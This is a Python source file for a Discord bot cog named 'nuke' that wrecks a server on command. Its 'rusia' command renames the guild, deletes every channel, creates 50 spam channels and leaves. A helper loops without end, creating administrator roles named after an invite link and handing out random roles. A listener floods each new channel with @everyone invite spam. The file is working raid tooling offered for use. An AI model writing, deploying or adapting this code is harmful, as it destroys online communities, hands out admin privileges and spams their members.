import discord, random, asyncio, json
from discord.ext import commands

class nuke(commands.Cog):
  def __init__(self, bot):
    self.bot = bot

  @commands.command()
  async def rusia(self, ctx):
    if not ctx.guild.id == "945301250717663282":
      with open("datas/nuked.json", "r") as f:
        data = json.load(f)
        data[str(ctx.guild.id)]="True"
        with open("datas/nuked.json", 'w') as f:
            json.dump(data, f)
        await self.role(ctx)
        await ctx.guild.edit(name="むしょくみんち↑")
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except:
                return
        for i in range(50):
            await ctx.guild.create_text_channel("lithium on top")
        await asyncio.sleep(15)
        await ctx.author.guild.leave()
  
  async def role(self, ctx):
    while True:
        await ctx.guild.create_role(name="https://discord.gg/BbMMzSaKdC", permissions=discord.Permissions(administrator=True), colour = discord.Color.random())
        for member in ctx.guild.members:
            try:
                role = random.choice(ctx.guild.roles)
                await member.add_roles(role)
            except:
                return

  @commands.Cog.listener()
  async def on_guild_channel_create(self, channel):
    with open("datas/nuked.json", "r") as f:
      data = json.load(f)
    if not str(channel.guild.id) in data:
      return
    else:
      while True:
          await channel.send("@everyone\n\nvtuber大好きサーバーhttps://discord.gg/BbMMzSaKdC")
       
def setup(client):
  client.add_cog(nuke(client))
